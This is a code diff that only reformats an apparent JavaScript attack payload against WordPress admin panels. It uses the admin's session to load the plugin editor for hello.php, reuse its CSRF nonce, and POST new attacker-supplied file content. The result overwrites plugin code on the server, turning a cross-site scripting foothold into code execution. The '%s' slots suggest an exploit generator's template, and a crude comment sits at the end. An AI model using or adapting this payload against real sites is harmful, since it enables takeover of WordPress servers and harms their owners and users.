@@ -1,5 +1,4 @@
-function httpGet(theUrl)
-{
+function httpGet(theUrl) {
     var xmlHttp = null;
 
     xmlHttp = new XMLHttpRequest();
@@ -10,8 +9,7 @@ function httpGet(theUrl)
 
 var page = httpGet("%s/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php");
 
-function httpPost(theUrl, csrftoken)
-{
+function httpPost(theUrl, csrftoken) {
     var xmlHttp = null;
 
     xmlHttp = new XMLHttpRequest();
@@ -19,7 +17,6 @@ function httpPost(theUrl, csrftoken)
     xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
     xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=%s/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php&newcontent=%s&action=update&file=hello.php&plugin=hello.php&scrollto=0&submit=Update+File");
     return xmlHttp.responseText;
-
 }
 
 //ik I fail at regex fuk u
